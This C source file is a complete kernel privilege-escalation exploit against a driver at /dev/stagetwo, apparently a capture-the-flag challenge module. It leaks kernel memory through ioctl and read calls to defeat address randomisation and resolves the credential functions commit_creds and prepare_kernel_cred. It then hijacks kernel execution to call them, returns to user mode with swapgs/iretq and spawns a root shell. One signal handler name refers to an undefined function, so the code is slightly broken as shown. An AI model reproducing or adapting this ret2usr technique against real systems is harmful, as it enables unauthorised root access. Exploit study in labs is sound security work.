#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

uint64_t _address(uint64_t kernelbase, uint64_t addr) {
    const uint64_t offset = 0xffffffff81000000;
    if (addr < offset) {
        fprintf(stderr, "Error: addr is less than the base offset (0xffffffff81000000).\n");
        return 0;
    }
    return kernelbase + (addr - offset);
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred;
uint64_t commit_creds;

void spawn_shell() {
    puts("[*] Hello from user land!");
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] UID: %d, got root!\n", uid);
        char *args[] = {"/bin/sh", NULL};
        char *env[] = {NULL};
        execve("/bin/sh", args, env); // Directly execute a shell
        perror("execve failed"); // If execve fails, print error
    } else {
        printf("[!] UID: %d, we root-less :(!\n", uid);
        exit(-1);
    }
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    puts("[+] Saved state");
}

uint64_t user_rip = (uint64_t)spawn_shell;

void privesc() {
    __asm__(".intel_syntax noprefix;"
            "movabs rax, prepare_kernel_cred;"
            "xor rdi, rdi;"
            "call rax;"
            "mov rdi, rax;"
            "movabs rax, commit_creds;"
            "call rax;"
            "swapgs;"
            "mov r15, user_ss;"
            "push r15;"
            "mov r15, user_sp;"
            "push r15;"
            "mov r15, user_rflags;"
            "push r15;"
            "mov r15, user_cs;"
            "push r15;"
            "mov r15, user_rip;"  // Where we return to!
            "push r15;"
            "iretq;"
            ".att_syntax;");
}


int main(){
  signal(SIGSEGV, shell); // anticipation if cannot return to userland safely as root
  int fd, check_kbase, stack_idx, size = 0x256;
  uint64_t kbase, raw_leak, leaking_kbase[size];
  size_t fuzz[2048] = {0};
  fd = open("/dev/stagetwo", O_RDWR);
  ioctl(fd, 0x1336, 0x170);
  check_kbase = read(fd, leaking_kbase, 0x128);
  check_kbase = read(fd, leaking_kbase, sizeof(leaking_kbase));
  for(int i = 0; i < size; i++){
    printf("%d - 0x%016lx\n", i, leaking_kbase[i]);
  }

  raw_leak = leaking_kbase[24];
  kbase = raw_leak - 0x1f13;
  commit_creds = _address(kbase, 0xffffffff8107e8b0);
  prepare_kernel_cred = _address(kbase, 0xffffffff8107ecb0);
  printf("[+] Raw leak: %p\n", raw_leak);
  printf("[+] kernel base: %p\n", kbase);
  printf("[+] commit_creds: %p\n", commit_creds);
  printf("[+] prepare_kernel_cred: %p\n", prepare_kernel_cred);
  save_state();
  ioctl(fd, 0x1337, (uint64_t)privesc);
  close(fd);
}
